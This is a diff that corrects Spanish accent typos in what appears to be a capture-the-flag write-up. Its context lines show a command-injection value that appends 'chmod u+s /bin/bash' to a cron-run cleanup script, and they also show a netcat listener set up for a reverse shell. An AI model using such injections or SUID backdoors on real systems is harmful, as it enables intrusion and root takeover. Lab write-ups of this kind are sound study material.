@@ -137,7 +137,7 @@ Una vez que la tarea cron haya ejecutado nuestro script, podremos utilizar el mo
 127.0.0. || echo 'chmod u+s /bin/bash' >> uploads/cleanup.sh
 ```
 
-Vamos a proceder a realizar una reverse shell para poder trabajar más comodamente.
+Vamos a proceder a realizar una reverse shell para poder trabajar más cómodamente.
 
 
 ### Intrusión (Reverse Shell)
@@ -159,7 +159,7 @@ sudo nc -lvnp 440
 <img width="723" height="88" alt="nc" src="https://github.com/user-attachments/assets/1dc57619-3557-4fcb-bff1-31912973d5ea" />
 <br><br>
 
-Ya somos el usuario www-data desde una terminal, ahora podemos sanitizarla o continuar usandola tal y como está.
+Ya somos el usuario www-data desde una terminal, ahora podemos sanitizarla o continuar usándola tal y como está.
 
 ```bash
 # Tratamiento de  la TTY para tener una consola interactiva cómoda
